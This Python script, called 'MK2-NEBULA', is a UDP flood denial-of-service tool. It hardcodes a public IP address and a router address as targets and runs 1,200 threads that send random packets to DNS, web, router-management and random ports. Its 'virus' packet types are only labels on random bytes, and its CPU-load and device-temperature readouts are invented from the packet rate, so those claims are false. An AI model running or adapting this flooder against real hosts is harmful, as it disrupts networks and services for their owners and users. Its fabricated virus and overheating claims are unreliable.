import socket
import threading
import time
import random

# ==================== TARGETS ====================
TARGETS = [
    "62.109.121.43",  # Target 1
    "192.168.1.1",    # Target 2
]

# ==================== NEBULA LOGGING STYLE ====================
class NebulaLogger:
    COLORS = {
        'SYSTEM': '\033[94m',     # Blue
        'SUCCESS': '\033[92m',    # Green  
        'WARNING': '\033[93m',    # Yellow
        'CRITICAL': '\033[91m',   # Red
        'DATA': '\033[96m',       # Cyan
        'VIRUS': '\033[95m',      # Magenta
        'RESET': '\033[0m',
    }
    
    @staticmethod
    def log_system(msg):
        print(f"{NebulaLogger.COLORS['SYSTEM']}[✦] {msg}{NebulaLogger.COLORS['RESET']}")
    
    @staticmethod
    def log_attack(target, pps, cpu, temp, status):
        color = NebulaLogger.COLORS['SUCCESS'] if pps > 50000 else NebulaLogger.COLORS['WARNING']
        print(f"{color}├─ [{target}] | {pps:,}/s | CPU:{cpu}% | {temp}°C | {status}{NebulaLogger.COLORS['RESET']}")
    
    @staticmethod
    def log_virus(virus_type, count):
        print(f"{NebulaLogger.COLORS['VIRUS']}   └─ {virus_type}: {count:,} packets{NebulaLogger.COLORS['RESET']}")
    
    @staticmethod
    def log_critical(msg):
        print(f"{NebulaLogger.COLORS['CRITICAL']}[☠] {msg}{NebulaLogger.COLORS['RESET']}")
    
    @staticmethod
    def log_data(msg):
        print(f"{NebulaLogger.COLORS['DATA']}[ℹ] {msg}{NebulaLogger.COLORS['RESET']}")

# ==================== VIRUS PAYLOAD ENGINE ====================
class VirusEngine:
    # VIRUS SIGNATURES
    VIRUS_CORES = [
        b'MEMEATER\x01',  # Memory consumption virus
        b'CPUBURN\x02',   # CPU overheating virus
        b'NETKILL\x03',   # Network disruption virus
        b'ROUTFUK\x04',   # Router firmware virus
        b'WIFIKIL\x05',   # WiFi jamming virus
        b'LEDFRY\x06',    # LED control virus
        b'HEATGEN\x07',   # Heat generation virus
        b'CRASHR\x08',    # Crash/reset virus
    ]
    
    @staticmethod
    def generate_virus(size=512, virus_type=None):
        """Generate virus-infected packet"""
        if virus_type is None:
            virus_type = random.choice(VirusEngine.VIRUS_CORES)
        
        # Virus structure
        header = virus_type
        replication = bytes([random.randint(0, 255) for _ in range(32)])  # Replication code
        trigger = bytes([random.randint(0x80, 0xFF) for _ in range(16)])  # Activation trigger
        payload = bytes([random.randint(0, 255) for _ in range(size - len(header) - len(replication) - len(trigger))])
        
        return header + replication + trigger + payload, virus_type[:7].decode('ascii', errors='ignore')

# ==================== LAG OPTIMIZATION ENGINE ====================
class LagOptimizer:
    def __init__(self):
        self.socket_pools = {target: [] for target in TARGETS}
        self.packet_pools = {target: [] for target in TARGETS}
        self.init_pools()
    
    def init_pools(self):
        """Pre-create sockets and packets to reduce lag"""
        for target in TARGETS:
            # Socket pool (50 sockets per target)
            for _ in range(50):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                    self.socket_pools[target].append(sock)
                except:
                    pass
            
            # Packet pool (1000 pre-generated virus packets)
            for _ in range(1000):
                payload, vtype = VirusEngine.generate_virus(random.randint(128, 1472))
                self.packet_pools[target].append((payload, vtype))
    
    def get_socket(self, target):
        """Get socket from pool with round-robin"""
        if not self.socket_pools[target]:
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return self.socket_pools[target][random.randint(0, len(self.socket_pools[target])-1)]
    
    def get_packet(self, target):
        """Get pre-generated packet from pool"""
        if not self.packet_pools[target]:
            payload, vtype = VirusEngine.generate_virus(random.randint(128, 1472))
            return payload, vtype
        return self.packet_pools[target][random.randint(0, len(self.packet_pools[target])-1)]

# ==================== MK2 THREAD ENGINE (1200 THREADS) ====================
class MK2NebulaEngine:
    def __init__(self):
        self.optimizer = LagOptimizer()
        self.thread_count = 0
        self.target_threads = {target: 600 for target in TARGETS}  # 600 per target
        self.stats = {
            target: {
                'total_packets': 0,
                'virus_counts': {vtype[:7].decode('ascii', errors='ignore'): 0 for vtype in VirusEngine.VIRUS_CORES},
                'cpu_est': 0,
                'temp_est': 45,
            }
            for target in TARGETS
        }
        self.stats_lock = threading.Lock()
    
    def virus_worker(self, target, worker_id, worker_type):
        """Virus attack worker thread"""
        while True:
            try:
                # Get pre-generated virus packet (LAG OPTIMIZED)
                payload, vtype = self.optimizer.get_packet(target)
                
                # Get socket from pool (LAG OPTIMIZED)
                sock = self.optimizer.get_socket(target)
                
                # Target specific port based on worker type
                if worker_type == 'DNS':
                    port = 53
                elif worker_type == 'HTTP':
                    port = random.choice([80, 443, 8080])
                elif worker_type == 'ROUTER':
                    port = random.choice([7547, 23, 161, 162])
                else:
                    port = random.randint(1, 65535)
                
                # SEND VIRUS
                sock.sendto(payload, (target, port))
                
                # Update stats
                with self.stats_lock:
                    self.stats[target]['total_packets'] += 1
                    if vtype in self.stats[target]['virus_counts']:
                        self.stats[target]['virus_counts'][vtype] += 1
                    
            except:
                # Silent fail for speed
                pass
    
    def start_attack(self):
        """Launch 1200 threads (600 per target)"""
        NebulaLogger.log_system("MK2-NEBULA INITIALIZING...")
        NebulaLogger.log_data(f"Targets: {len(TARGETS)}")
        NebulaLogger.log_data(f"Total Threads: {sum(self.target_threads.values())}")
        NebulaLogger.log_data(f"Virus Types: {len(VirusEngine.VIRUS_CORES)}")
        print("")
        
        # Worker types for each target
        worker_types = ['DNS', 'HTTP', 'ROUTER', 'MIXED']
        
        for target in TARGETS:
            NebulaLogger.log_system(f"DEPLOYING TO: {target}")
            
            # Distribute 600 threads per target across worker types
            threads_per_type = 150  # 600 / 4 = 150 each
            
            for worker_type in worker_types:
                for i in range(threads_per_type):
                    t = threading.Thread(
                        target=self.virus_worker,
                        args=(target, i, worker_type),
                        daemon=True
                    )
                    t.start()
                    self.thread_count += 1
            
            NebulaLogger.log_data(f"  Threads deployed: {threads_per_type * 4}")
        
        NebulaLogger.log_system(f"TOTAL DEPLOYED: {self.thread_count} VIRUS THREADS")
        print("")

# ==================== MAIN EXECUTION ====================
engine = MK2NebulaEngine()
engine.start_attack()

# ==================== NEBULA MONITORING ====================
last_log = time.time()
cycle = 0

while True:
    time.sleep(3)  # Update every 3 seconds
    current_time = time.time()
    elapsed = current_time - last_log
    last_log = current_time
    cycle += 1
    
    # Clear screen for nebula effect (optional)
    # print("\033[H\033[J")
    
    # NEBULA HEADER
    print(f"{NebulaLogger.COLORS['SYSTEM']}╔{'═'*70}╗{NebulaLogger.COLORS['RESET']}")
    print(f"{NebulaLogger.COLORS['SYSTEM']}║{' '*24}MK2-NEBULA v2.0{' '*24}║{NebulaLogger.COLORS['RESET']}")
    print(f"{NebulaLogger.COLORS['SYSTEM']}║{' '*20}Dual-Target Virus Attack{' '*20}║{NebulaLogger.COLORS['RESET']}")
    print(f"{NebulaLogger.COLORS['SYSTEM']}╚{'═'*70}╝{NebulaLogger.COLORS['RESET']}")
    
    # Update and display stats for each target
    with engine.stats_lock:
        total_global_pps = 0
        
        for idx, target in enumerate(TARGETS):
            # Calculate PPS
            pps = int(engine.stats[target]['total_packets'] / elapsed) if elapsed > 0 else 0
            total_global_pps += pps
            
            # Update CPU and temp estimates based on attack intensity
            engine.stats[target]['cpu_est'] = min(100, 30 + (pps / 400))
            engine.stats[target]['temp_est'] = min(145, 45 + (pps / 300) + (cycle * 0.1))
            
            # Determine attack status
            if pps > 80000:
                status = "MAXIMUM ANNIHILATION"
            elif pps > 50000:
                status = "CRITICAL OVERLOAD"
            elif pps > 30000:
                status = "HIGH INTENSITY"
            elif pps > 15000:
                status = "MODERATE PRESSURE"
            else:
                status = "INITIALIZING"
            
            # Display target status
            NebulaLogger.log_attack(
                target=target,
                pps=pps,
                cpu=int(engine.stats[target]['cpu_est']),
                temp=int(engine.stats[target]['temp_est']),
                status=status
            )
            
            # Show top 3 viruses for this target
            virus_items = list(engine.stats[target]['virus_counts'].items())
            virus_items.sort(key=lambda x: x[1], reverse=True)
            
            for vtype, count in virus_items[:3]:  # Top 3
                if count > 0:
                    NebulaLogger.log_virus(vtype, count)
            
            # Reset counters
            engine.stats[target]['total_packets'] = 0
            for vtype in engine.stats[target]['virus_counts']:
                engine.stats[target]['virus_counts'][vtype] = 0
            
            if idx < len(TARGETS) - 1:
                print("")
    
    # GLOBAL STATS
    print(f"{NebulaLogger.COLORS['DATA']}╠{'─'*70}╣{NebulaLogger.COLORS['RESET']}")
    print(f"{NebulaLogger.COLORS['DATA']}├─ GLOBAL: {total_global_pps:,} PPS | THREADS: {engine.thread_count} | CYCLE: {cycle}{NebulaLogger.COLORS['RESET']}")
    
    # WARNINGS
    for target in TARGETS:
        if engine.stats[target]['temp_est'] > 120:
            NebulaLogger.log_critical(f"{target} THERMAL CRITICAL: {int(engine.stats[target]['temp_est'])}°C")
        elif engine.stats[target]['temp_est'] > 90:
            NebulaLogger.log_critical(f"{target} HIGH TEMPERATURE: {int(engine.stats[target]['temp_est'])}°C")
        
        if engine.stats[target]['cpu_est'] > 95:
            NebulaLogger.log_critical(f"{target} CPU MELTDOWN: {int(engine.stats[target]['cpu_est'])}%")
    
    print(f"{NebulaLogger.COLORS['SYSTEM']}{'─'*70}{NebulaLogger.COLORS['RESET']}")
    print("")
